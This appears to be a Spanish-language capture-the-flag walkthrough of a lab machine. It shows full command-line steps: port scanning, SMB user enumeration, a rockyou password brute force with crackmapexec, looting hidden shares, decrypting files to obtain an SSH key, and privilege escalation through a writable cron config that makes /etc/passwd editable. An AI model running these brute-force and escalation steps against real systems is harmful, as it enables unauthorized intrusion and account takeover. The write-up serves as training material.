## Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```
```ruby
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 11:31 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 95:c4:a3:20:eb:9a:2d:7f:0d:57:89:a7:6a:11:e0:ff (ECDSA)
|_  256 b4:81:b9:fd:6e:3e:fa:47:f1:b2:69:b4:dc:42:05:03 (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.19.5-Ubuntu (workgroup: WORKGROUP)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 006A558D760F; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-12-10T14:31:38
|_  start_date: N/A
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.19.5-Ubuntu)
|   Computer name: 006a558d760f
|   NetBIOS computer name: 006A558D760F\x00
|   Domain name: 
|   FQDN: 006a558d760f
|_  System time: 2024-12-10T15:31:38+01:00
|_nbstat: NetBIOS name: 006A558D760F, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: mean: -20m00s, deviation: 34m38s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.74 seconds
```

observo solo 2 servicios corriendo, el servicio `samba` y `ssh` asi que comienzo con `samba`

## SMB

dumpeo toda la informacion que pueda con `enum4linux-ng`

```ruby
enum4linux-ng 172.17.0.2
```

```ruby
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 172.17.0.2
[*] Username ......... ''
[*] Random Username .. 'ozvahdbx'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ===================================
|    Listener Scan on 172.17.0.2    |
 ===================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =========================================================
|    NetBIOS Names and Workgroup/Domain for 172.17.0.2    |
 =========================================================
[+] Got domain/workgroup name: WORKGROUP
[+] Full NetBIOS names information:
- 006A558D760F    <00> -         B <ACTIVE>  Workstation Service
- 006A558D760F    <03> -         B <ACTIVE>  Messenger Service
- 006A558D760F    <20> -         B <ACTIVE>  File Server Service
- ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
- WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
- WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
- WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections
- MAC Address = 00-00-00-00-00-00

 =======================================
|    SMB Dialect Check on 172.17.0.2    |
 =======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: true
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 =========================================================
|    Domain Information via SMB session for 172.17.0.2    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: 006A558D760F
NetBIOS domain name: ''
DNS domain: ''
FQDN: 006a558d760f
Derived membership: workgroup member
Derived domain: unknown

 =======================================
|    RPC Session Check on 172.17.0.2    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'ozvahdbx', password ''
[H] Rerunning enumeration with user 'ozvahdbx' might give more results

 =================================================
|    Domain Information via RPC for 172.17.0.2    |
 =================================================
[+] Domain: WORKGROUP
[+] Domain SID: NULL SID
[+] Membership: workgroup member

 =============================================
|    OS Information via RPC for 172.17.0.2    |
 =============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Linux/Unix (Samba 4.19.5-Ubuntu)
OS version: '6.1'
OS release: ''
OS build: '0'
Native OS: Windows 6.1
Native LAN manager: Samba 4.19.5-Ubuntu
Platform id: '500'
Server type: '0x809a03'
Server type string: Wk Sv PrQ Unx NT SNT 006a558d760f server (Samba, Ubuntu)

 ===================================
|    Users via RPC on 172.17.0.2    |
 ===================================
[*] Enumerating users via 'querydispinfo'
[+] Found 2 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 2 user(s) via 'enumdomusers'
[+] After merging user results we have 2 user(s) total:
'1000':
  username: itadmin
  name: ''
  acb: '0x00000010'
  description: ''
'1001':
  username: manager
  name: ''
  acb: '0x00000010'
  description: ''

 ====================================
|    Groups via RPC on 172.17.0.2    |
 ====================================
[*] Enumerating local groups
[+] Found 0 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 0 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 0 group(s) via 'enumdomgroups'

 ====================================
|    Shares via RPC on 172.17.0.2    |
 ====================================
[*] Enumerating shares
[+] Found 4 share(s):
IPC$:
  comment: IPC Service (006a558d760f server (Samba, Ubuntu))
  type: IPC
it_data:
  comment: ''
  type: Disk
print$:
  comment: Printer Drivers
  type: Disk
public:
  comment: ''
  type: Disk
[*] Testing share IPC$
[+] Mapping: OK, Listing: NOT SUPPORTED
[*] Testing share it_data
[+] Mapping: DENIED, Listing: N/A
[*] Testing share print$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share public
[+] Mapping: OK, Listing: OK

 =======================================
|    Policies via RPC for 172.17.0.2    |
 =======================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: None
  Minimum password length: 5
  Maximum password age: 49710 days 6 hours 21 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: 49710 days 6 hours 21 minutes

 =======================================
|    Printers via RPC for 172.17.0.2    |
 =======================================
[+] No printers returned (this is not an error)

Completed after 1.69 seconds
```

de aqui lo que mas me interesa son los usuarios que se obtienen 

![image](https://github.com/user-attachments/assets/7c076698-a09c-47a9-aa94-4c7093ab8a33)

ya con los usuarios, aplico un ataque de diccionario para intentar conseguir credenciales y poder acceder a los recursos compartidos


```ruby
crackmapexec smb 172.17.0.2 -u itadmin -p /usr/share/wordlists/rockyou.txt |grep -v STATUS_LOGON_FAILURE
```

![image](https://github.com/user-attachments/assets/cedee252-2c5f-4711-ac84-a168d0789fc9)

obtengo credenciales asi que chequeo los recursos compartidos

```ruby
smbmap -u itadmin -p iloveyou1 -H 172.17.0.2
```

![image](https://github.com/user-attachments/assets/ba05c28e-876d-41e2-abd8-2701aea4be89)

```ruby
smbmap -u itadmin -p iloveyou1 -H 172.17.0.2 -r public
```

![image](https://github.com/user-attachments/assets/aec02db8-f81c-408f-9c67-989c269c64ac)

```ruby
smbmap -u itadmin -p iloveyou1 -H 172.17.0.2 -r it_data
```

![image](https://github.com/user-attachments/assets/d08eb99f-1cd8-444d-a5f7-c7f751a49221)

ya observo archivos en los directorios `it_data` & `public` por lo que me los traigo a mi maquina 

```ruby
smbclient //172.17.0.2/it_data -U itadmin%iloveyou1 -c 'get protected.zip' && smbclient //172.17.0.2/it_data -U itadmin%iloveyou1 -c 'get passwd_policy.txt'
```

```ruby
smbclient //172.17.0.2/public -U itadmin%iloveyou1 -c 'get decrypt_hint.txt' && smbclient //172.17.0.2/public -U itadmin%iloveyou1 -c 'get notes.txt'
```

![image](https://github.com/user-attachments/assets/6cc4a18b-064b-4278-a12a-ba9d58ba7769)

ya tengo los archivos en mi maquina si que los reviso:

```ruby
cat decrypt_hint.txt 
Hola equipo,

Como parte de nuestra política de seguridad, recuerden que todas las contraseñas deben cumplir con los siguientes criterios:

- Tener al menos 8 caracteres.
- Incluir al menos una letra mayúscula, una minúscula, un número y un símbolo.
- No utilizar palabras comunes o fáciles de adivinar.

Por ejemplo, para el archivo cifrado en 'confidential', la contraseña es: ExPl0r3.2024

Por favor, asegúrense de seguir estas pautas al establecer nuevas contraseñas. La seguridad de nuestra información depende de ello.

Saludos,
itadmin
```

por lo visto existe un archivo cifrado en lo que parece ser un recurso compartido llamado `confidencial`, (el cual no lo vi, puede ser visible para el otro user), continuo
chequeando los demas archivos

```ruby
cat notes.txt       
Hola equipo,

Parece que tuvimos un problema con las credenciales de acceso a 'it_data'. No podemos recordar la contraseña, pero estoy seguro de que es algo sencillo. Tal vez algo que alguien podría adivinar si lo intenta lo suficiente...

Mientras tanto, he dejado una copia de la contraseña del ZIP en 'confidential'. Por favor, no compartan esta información con nadie fuera del equipo.

Saludos,
itadmin
```

por lo visto el archivo `.zip` esta protegido por una password que se encuentra en el mismo directorio `confidential` 


```ruby
cat passwd_policy.txt
Hola,

De acuerdo con nuestra política de seguridad, todas las contraseñas deben cambiarse cada 3 meses para garantizar la seguridad de nuestro sistema.

Notamos que tu contraseña actual, '3xpl0r3!', ya ha superado este límite de tiempo. Por favor, cámbiala a la brevedad utilizando el siguiente comando:

  passwd

Recuerda que las nuevas contraseñas deben cumplir con los siguientes requisitos:
- Al menos 8 caracteres.
- Incluir una letra mayúscula, una minúscula, un número y un símbolo.
- No reutilizar ninguna de las últimas 5 contraseñas.

Si tienes dudas o necesitas ayuda, contacta con el equipo de TI.

Gracias,
- Equipo de Seguridad TI
```

aqui obtengo una credencial pero no se especifica el usuario, por lo que probare con el user `manager` via `ssh` y `smb` y `itadmin` por via `ssh` a ver a quien pertecene
y a cual, servicio

```ruby
smbmap -u manager -p '3xpl0r3!' -H 172.17.0.2
```

![image](https://github.com/user-attachments/assets/ec7029da-fcff-4fae-977a-6e2ae96d5fd8)

la credencial pertecene al user `manager` en el servicio `smb`, con este user tampoco observo el recurso compartido `confidential`, pero si pruebo acceder a el directamente
con el user `manager` logro resultados


```ruby
smbclient //172.17.0.2/confidential -U manager%3xpl0r3!
```
![image](https://github.com/user-attachments/assets/f505e148-5b00-4886-ad64-7959f9ff5b21)

el recurso compartido por lo visto estaba oculto, pero conociendo su ruta es posible el acceso, aqui observo mas archivos que tambien me llevare a mi maquina atacante

```ruby
smb: \> get password.txt.gpg
```
```ruby
smb: \> get logs.log
```

ahora si recordamos los mensajes en los archivos anteriores nos dan la password `ExPl0r3.2024` para el archivo encriptado en confidential `password.txt.gpg`
por lo que desencripto el archivo

```ruby
gpg password.txt.gpg
```
obtenemos el archivo `password.txt` que al leerlo observamos la password para poder descomprimir el archivo `protected.zip`, asi que descomprimo el `.zip`

```ruby
unzip -o protected.zip
```

aqui obtenemos el archivo `private_key.txt` que si lo leemos es claramente una llave `id_rsa` y lo confirmo con un `file private_key.txt` y si ahora
leemos el archivo `logs.log` vemos un usuario que accede via ssh `devuser` asi que pruebo la llave `private_key.txt` con el usuario `devuser` via `ssh`
y logro el acceso

```ruby
chmod og-rwx private_key.txt # asigno los permisos necesarios a la llave para que funcione
```

```ruby
ssh -i private_key.txt devuser@172.17.2 # accedo via ssh
```

## Escalada de Privilegios

### devuser

cambio de shell con un `/bin/bash`, y listo los procesos

```ruby
ps auxf
```
![image](https://github.com/user-attachments/assets/8b7e2dfb-2c74-45e5-9dad-7b31d9775746)

el servicio `cron` esta inciado lo que me hace pensar que se programo alguna tarea, por lo que chequeo `/etc/crontab`

![image](https://github.com/user-attachments/assets/f9838765-7f46-4595-b4b0-ab012595239a)

en efecto se a programado una tarea y vemos que es ejecutado cada minuto un script en `/opt/scripts/manage_files.sh` por lo que chequeo el script

```ruby
cat /opt/scripts/manage_files.sh

#!/bin/bash

# Leer el archivo de configuración
source /opt/config/secure.conf

if [ "$safe_mode" = "true" ]; then
    chmod 600 /etc/passwd
    echo "Sistema en modo seguro."
else
    chmod 666 /etc/passwd
    echo "Sistema en modo inseguro."
fi
```

el script lo que hace es comprobar el archivo de configuracion en `/opt/config/secure.conf` para validar de que `safe_mode` sea `true` y asignar los permisos `600`
al archivo `/etc/passwd` y en caso contrario de que `safe_mode` no sea `true`, entonces se le asignan los permisos `666` al archivo `/etc/passwd`; asi que chequeo
que permisos tiene el archivo de configuracion `/opt/config/secure.conf` para ver si puedo editarlo

```ruby
ls -la /opt/config/secure.conf
-rw-rw-rw- 1 0 root 15 Dec 10 13:18 /opt/config/secure.conf
```
puedo editar el archivo, asi que lo edito para que `mode_safe` no sea `true` y el script `/opt/scripts/manage_files.sh` le asigne permisos `666` a `/etc/passwd` y poder
escalar a `root`

```ruby
echo 'safe_mode=false' > /opt/config/secure.conf
```

ya modificado el archivo de configuracion queda esperar un poco a que se vuelva ejecutar la tarea programada en `crontab` y se le asignen los permisos `666` a `/etc/passwd`

```ruby
ls -la /etc/passwd
-rw-rw-rw- 1 root root 1375 Dec 10 13:12 /etc/passwd
```

ya fueron asignados los permisos luego de un par de segundos... estos permisos me permiten editar el archivo `/etc/passwd`, aqui solo elimino la `x` que contiene `root`
en su linea para asi poder escalar a `root`

![image](https://github.com/user-attachments/assets/483260e8-6d66-4d95-b4a2-d91688efa915)

































